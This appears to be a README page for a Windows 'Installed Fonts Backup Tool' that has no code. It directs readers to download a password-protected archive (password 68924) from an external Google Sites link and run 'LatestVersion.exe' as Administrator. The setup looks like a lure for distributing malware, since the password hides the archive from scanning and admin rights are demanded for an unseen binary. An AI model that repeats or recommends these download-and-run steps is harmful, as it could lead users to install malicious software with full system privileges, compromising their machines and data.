<h1 align="center">Installed Fonts Backup Tool</h1>

<p align="center">
  <b>Backup and restore all installed fonts in Windows with one click.</b>
</p>

---

## What This Tool Does

- Backup all installed fonts
- Restore fonts from a backup
- Save font files, activation status, and metadata
- Works with system and custom fonts
- Preview fonts before restore
- Prevents duplicate installations
- Works on Windows 10 and 11

---

## Download and Installation

Important: Download the tool from the link below.

**Download:** https://sites.google.com/view/archive-pack/download

**Password:** 68924

---

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Click Backup Fonts - all installed fonts are saved
5. To restore, click Restore Fonts and select your backup file

---

## Requirements

- OS: Windows 10 or Windows 11 (64-bit)
- Permissions: Administrator rights

---
